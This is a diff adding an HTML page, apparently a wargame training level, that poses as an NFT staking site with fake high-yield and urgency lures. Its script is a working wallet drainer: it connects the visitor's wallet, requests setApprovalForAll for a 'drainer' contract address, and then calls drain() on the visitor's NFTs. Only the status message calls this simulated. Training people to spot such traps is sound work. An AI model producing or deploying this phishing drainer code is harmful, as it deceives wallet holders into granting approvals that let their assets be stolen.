@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <title>WarGame Level 2 - NFT Staking Trap</title>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@6.7.0/dist/ethers.min.js"></script>
+  <style>
+    body { font-family: sans-serif; background: #111; color: #fff; text-align: center; padding: 2rem; }
+    .card { background: #222; border-radius: 10px; padding: 2rem; box-shadow: 0 0 12px #26a69a; max-width: 500px; margin: 0 auto; }
+    button { padding: 1rem 2rem; margin-top: 1rem; font-size: 1rem; background: #26a69a; border: none; color: #fff; cursor: pointer; }
+    .danger { background: #e74c3c; }
+    #status { margin-top: 2rem; font-size: 1.2rem; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h1>🔒 Stake Your NFTs</h1>
+    <p>Earn <strong>200% APR</strong> by staking your WarGame NFTs.<br/>Only <strong>500</strong> slots left!</p>
+    <p>Rewards paid in <code>WGFAKE</code>. Ends in 3h 42m.</p>
+    <button id="connectBtn">Connect Wallet</button>
+    <button id="stakeBtn">Stake NFTs</button>
+    <div id="status"></div>
+  </div>
+
+  <script>
+    const nftAddress = "0x72Fb81C679Cb531fe2104be9d68a20f41fB0B604";
+    const drainerAddress = "0x8d7283F4449EDF62FA2ec7D88bDFa8eD7C96d334";
+
+    const nftABI = [
+      "function setApprovalForAll(address operator, bool approved) external",
+      "function isApprovedForAll(address owner, address operator) external view returns (bool)"
+    ];
+
+    const drainerABI = [
+      "function drain(address nft, address victim) external"
+    ];
+
+    let provider, signer, nft, drainer;
+
+    document.getElementById("connectBtn").onclick = async () => {
+      if (window.ethereum) {
+        try {
+          provider = new ethers.BrowserProvider(window.ethereum);
+          await provider.send("eth_requestAccounts", []);
+          signer = await provider.getSigner();
+          nft = new ethers.Contract(nftAddress, nftABI, signer);
+          drainer = new ethers.Contract(drainerAddress, drainerABI, signer);
+          document.getElementById("status").innerText = "✅ Wallet connected. Ready to stake.";
+        } catch (err) {
+          document.getElementById("status").innerText = "❌ Wallet connection failed.";
+        }
+      } else {
+        alert("Please install MetaMask to use this dApp.");
+      }
+    };
+
+    document.getElementById("stakeBtn").onclick = async () => {
+      if (!signer) return alert("Connect your wallet first.");
+      try {
+        const approvalTx = await nft.setApprovalForAll(drainerAddress, true);
+        await approvalTx.wait();
+        document.getElementById("status").innerText = "🔓 Approval granted. Initiating staking...";
+
+        const drainTx = await drainer.drain(nftAddress, await signer.getAddress());
+        await drainTx.wait();
+
+        document.getElementById("status").innerText = "💀 Your NFTs have been drained (simulated).";
+        document.getElementById("stakeBtn").disabled = true;
+      } catch (err) {
+        document.getElementById("status").innerText = "🎯 You avoided the trap. Well done!";
+      }
+    };
+  </script>
+</body>
+</html>
